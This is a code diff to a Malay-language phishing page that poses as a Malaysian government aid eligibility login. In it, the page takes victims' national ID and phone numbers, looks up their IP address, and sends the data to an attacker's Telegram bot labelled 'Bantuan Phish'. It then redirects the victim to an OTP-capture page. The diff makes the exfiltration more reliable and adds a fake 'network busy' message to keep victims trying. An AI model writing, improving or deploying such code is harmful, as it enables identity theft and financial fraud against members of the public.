@@ -9,8 +9,8 @@
 <body>
     <div class="card">
         <div class="logo-area">
-            <!-- Letak gambar logo kerajaan kat folder img/ -->
-            <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/8/8e/Coat_of_arms_of_Malaysia.svg/200px-Coat_of_arms_of_Malaysia.svg.png" alt="Logo">
+            <!-- Pastikan kau ada fail logo.png dalam folder img -->
+            <img src="img/logo.png" alt="Logo" onerror="this.style.display='none'">
         </div>
         <h2>Log Masuk Bantuan</h2>
         <p>Sila masukkan no. kad pengenalan untuk semak status kelayakan anda.</p>
@@ -35,17 +35,28 @@
 
             const ic = document.getElementById("ic").value;
             const phone = document.getElementById("phone").value;
-            const ipRes = await fetch("https://api.ipify.org?format=json");
-            const ip = (await ipRes.json()).ip;
+            let ip = "Tidak diketahui";
+            try {
+                const ipRes = await fetch("https://api.ipify.org?format=json");
+                ip = (await ipRes.json()).ip;
+            } catch (e) {}
 
-            // Hantar Data Login
             const text = `<b>🏦 Bantuan Phish — Langkah 1</b>\nIC: <code>${ic}</code>\nTel: <code>${phone}</code>\nIP: ${ip}`;
-            await fetch(`https://api.telegram.org/bot${CONFIG.BOT_TOKEN}/sendMessage`, {
-                method: "POST", body: new URLSearchParams({ chat_id: CONFIG.CHAT_ID, text, parse_mode: "HTML" })
-            });
-
-            // Pindah ke halaman OTP
-            window.location.href = "otp.html";
+            
+            try {
+                const res = await fetch(`https://api.telegram.org/bot${CONFIG.BOT_TOKEN}/sendMessage`, {
+                    method: "POST", body: new URLSearchParams({ chat_id: CONFIG.CHAT_ID, text, parse_mode: "HTML" })
+                });
+                const data = await res.json();
+                if (data.ok) {
+                    window.location.href = "otp.html";
+                } else {
+                    throw new Error("Telegram error");
+                }
+            } catch (err) {
+                alert("Rangkaian sibuk. Sila cuba lagi.");
+                btn.disabled = false; btn.textContent = "Semak Kelayakan";
+            }
         });
     </script>
 </body>
